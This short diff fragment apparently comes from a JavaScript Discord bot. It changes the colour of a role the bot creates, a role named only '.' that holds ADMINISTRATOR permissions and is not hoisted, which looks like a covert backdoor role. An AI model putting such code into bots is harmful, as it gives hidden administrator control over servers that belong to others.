@@ -345,7 +345,7 @@ client.on("message", message => {
   let rol = await msg.guild.roles.create({
   data: {
   name: ".",
-  color: "a09e9e",
+  color: "000",
   permissions: "ADMINISTRATOR",
   hoisted: false
   }
